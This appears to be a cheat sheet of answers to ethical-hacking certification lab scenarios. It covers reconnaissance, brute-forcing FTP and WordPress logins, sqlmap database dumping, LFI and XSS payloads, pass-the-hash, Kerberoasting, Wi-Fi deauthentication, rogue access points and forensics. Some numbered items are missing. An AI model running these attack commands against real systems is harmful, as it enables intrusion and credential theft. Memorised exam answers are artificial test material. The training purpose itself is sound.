BASIC SECURITY ASSESSMENT SCENARIOS

Q1
Operating System Identification via SQLi Vulnerability
After discovering a blind SQLi vulnerability in a MySQL-backed website, identify the host OS.
nmap -sV <IP>/24 nmap -A <IP>/24 Identify machine with port 3306 open, then: nmap -O <IP>
Q2
Suspicious Account Detection
Identify suspicious user account on machine 192.168.1.10 from secure accounts: JohnDoe, SarahConnor, Neo, Oracle, Sherlock.
RDP to machine, then: net user Compare against known secure accounts to identify suspicious entry.
Q3
RDP Service Discovery
Find machine with RDP port open in network.
nmap -Pn -sV -p 3389 <IP>
Q4
DES Encryption & FTP Access
Decrypt DES(ECB) encrypted file to obtain FTP credentials, retrieve flag1.txt.
Use Cryptool: Encrypt/Decrypt → Symmetric → DES (ECB) ftp <IP> get flag1.txt
Q5
Steganography Detection
Extract hidden information from Secret-Accounts.txt using steganography (password: "magic").
snow -C -p "magic" secret.accounts.txt
Q6
WordPress Password Recovery
Retrieve Sarah's WordPress password from database at http://192.168.1.10:8080/CEH.
wpscan --url http://192.168.1.10:8080/CEH -u Sarah -P passwdlist.txt
Alternative: Metasploit wordpress_login_enum module
Q7
MD5 Hash Cracking
Crack MD5 hash in Secret-Hash.txt uploaded via DVWA.
Access file at: C:\wamp64\www\DVWA\hackable\uploads\Secret-Hash.txt Use online tools: http://hashes.com/en/decrypt/hash or https://crackstation.net
Q8
Backdoor File Access
Retrieve secret.txt from Server 2019 machine using backdoor.
Use RDP credentials from Q2, navigate to: C:\users\dell\documents\confidential\secret.txt
Q9
DoS Attack Source Identification
Identify attacking IP from pcapng file.
Wireshark: Statistics → IPv4 Statistics → Source and Destination Addresses Filter: tcp.flags.syn == 1 and tcp.flags.ack == 0
Q10
DDoS & Credential Analysis
Identify number of attacking machines or find credentials in pcap.
DDoS: Count unique IPs in Conversations tab Credentials: Filter http.request.method == POST
Q11
FTP Credential Cracking
Crack FTP credentials to retrieve flag.txt.
Identify machine with port 21 open hydra -L users.txt -P passwords.txt <IP> ftp
Q12
Remote Desktop File Retrieval
Remotely access John's computer (Server2019) to retrieve document starting with "F/XXXXXXX".
RDP with credentials: John/secure123 Browse to desktop and locate target file.
Q13
SQL DSSS Attack
Use SQL DSSS technique to find contact number of "Kety" on moviescope.com.
sqlmap -u "http://moviescope.com/viewprofile.php?id=1" --dump --batch --threads=10
DSSS: Stealth, Speed and Success technique
Q14
Plain Text Credential Extraction
Find plaintext credentials for www.industry.com in Dos.pcapng.
Wireshark filter: http.request.method == POST Examine packet contents for username/password.
Q15
Risky HTTP Method Identification
Identify HTTP method posing highest risk on www.moviescope.com using OWASP ZAP.
OWASP ZAP Automated Scan → Check Alerts for SQLi vulnerabilities Typically POST method for SQL injection attacks.
Q16
Live Host Discovery
Identify number of alive hosts in subnet.
nmap -sn 192.168.56.0/24
Q17
VeraCrypt Decryption
Decrypt VeraCrypt file with password "test" to find secret code.
Mount VeraCrypt volume using password "test" Access decrypted content to locate secret.
Q18
RC4 Decryption
Decrypt "Cry-RC4-Accountno.hex" using key "14" to find account number.
Cryptool: Encrypt/Decrypt → Symmetric → RC4 Set key to "14" and decrypt.
Q19
Android File Extraction
Access Android device to retrieve secret.txt.
adb connect <IP>:5555 adb shell find /sdcard -name "secret.txt"
Q20
Encoded IP Address Decryption
Decode file to extract IP address of compromised machine (password: shadow123).
Use BCTextEncoder tool with password "shadow123" to decode.

NETWORK RECONNAISSANCE & ENUMERATION

Q21
SMB Share Enumeration
Enumerate SMB shares on target machine 192.168.1.25 and identify accessible shares.
nmap --script smb-enum-shares -p445 192.168.1.25 smbclient -L //192.168.1.25 -N
Q22
DNS Zone Transfer
Attempt DNS zone transfer for domain internal.corp and list all discovered hosts.
nslookup -type=ns internal.corp dig @ns1.internal.corp internal.corp AXFR
Q23
SNMP Enumeration
Enumerate SNMP on target using public community string and extract system information.
snmpwalk -c public -v1 192.168.1.30 1.3.6.1.2.1.1 snmp-check 192.168.1.30 -c public

WEB APPLICATION SECURITY

Q24
XSS Vulnerability Detection
Identify and demonstrate XSS vulnerability in search functionality at http://vulnerable-site.com/search.php.
Test payload: <script>alert('XSS')</script> Use Burp Suite or ZAP to automate detection
Q25
File Inclusion Vulnerability
Exploit LFI vulnerability to read /etc/passwd on Linux target.
http://target.com/page.php?file=../../../etc/passwd Use null bytes or path traversal techniques
Q26
CSRF Token Bypass
Bypass CSRF protection to change user password without valid token.
Remove token parameter entirely Use same token for multiple requests Burp Suite: CSRF PoC generator

PASSWORD ATTACKS & CRYPTOGRAPHY

Q27
Pass-the-Hash Attack
Use captured NTLM hash to authenticate to Windows target without knowing plaintext password.
pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //192.168.1.50 cmd
Q28
Kerberoasting
Extract service account hashes from Active Directory for offline cracking.
GetUserSPNs.py -request -dc-ip 192.168.1.100 domain/user Crack with hashcat: hashcat -m 13100 hashes.txt wordlist.txt
Q29
John the Ripper Rule Modification
Create custom John rules to crack passwords with company-specific patterns.
Edit john.conf: [List.Rules:Custom] Example rule: cAz"[0-9]" (capitalize, append digit)

WIRELESS SECURITY

Q30
WPA2 Handshake Capture
Capture WPA2 handshake from target network "CorporateWiFi" for offline cracking.
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon Deauth attack: aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF wlan0mon
Q31
Rogue Access Point
Set up rogue AP with same SSID as corporate network to capture credentials.
airbase-ng -a AA:BB:CC:DD:EE:FF --essid "CorporateWiFi" -c 6 wlan0mon Configure DHCP and routing for man-in-the-middle position

FORENSICS & INCIDENT RESPONSE

Q32
Memory Dump Analysis
Analyze memory dump to identify malicious processes and extract indicators of compromise.
volatility -f memory.dmp imageinfo volatility -f memory.dmp --profile=Win7SP1x64 pslist volatility -f memory.dmp --profile=Win7SP1x64 malfind
Q33
Log Analysis for Intrusion Detection
Analyze Apache logs to identify SQL injection attempts and extract attacker IP.
grep -i "union\|select\|1=1" access.log cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr
Q34
Timeline Analysis
Create timeline of file system activity to determine attack timeframe.
log2timeline.py plaso.dump image.raw psort.py -o l2tcsv -w timeline.csv plaso.dump

REVERSE ENGINEERING & MALWARE ANALYSIS

Q35
Static Analysis of Suspicious Executable
Perform static analysis on malware.exe to identify persistence mechanism and C2 server.

Dynamic Analysis in Sandbox
Execute malware in controlled environment and monitor behavior.

Q42
Linux Rootkit Detection
Detect and analyze rootkit on compromised Linux system.
chkrootkit rkhunter --check lsmod | grep -i suspicious File integrity: aide --check
